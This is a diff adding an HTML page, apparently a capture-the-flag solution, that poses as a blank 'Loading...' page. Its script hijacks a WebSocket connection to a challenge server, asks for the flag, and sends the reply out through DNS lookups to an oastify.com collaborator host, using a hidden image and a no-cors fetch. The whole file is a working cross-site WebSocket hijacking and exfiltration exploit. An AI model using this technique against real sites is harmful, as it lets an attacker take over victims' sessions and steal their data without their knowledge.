@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // Open WebSocket to target server
+        const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+        
+        ws.onopen = () => {
+            // Send the getFlag command
+            ws.send(JSON.stringify({message: '/getFlag'}));
+        };
+        
+        ws.onmessage = (event) => {
+            const response = JSON.parse(event.data);
+            if (response.message.includes('Flag:')) {
+                // DNS exfiltration technique
+                const flag = encodeURIComponent(response.message)
+                    .replace(/%/g, '.')  // Convert % encoding to dots
+                    .substring(0, 60);   // Limit length to avoid issues
+                
+                // Create hidden image that will trigger DNS lookup
+                const img = new Image();
+                img.src = `https://${flag}.zux82c1krnku6qwz2ft9uc3lkcq3ev2k.oastify.com`;
+                
+                // Alternative method using fetch (might still do DNS lookup)
+                fetch(`https://${flag}.zux82c1krnku6qwz2ft9uc3lkcq3ev2k.oastify.com`, {mode: 'no-cors'})
+                    .catch(() => {});
+            }
+        };
+    </script>
+</body>
+</html>
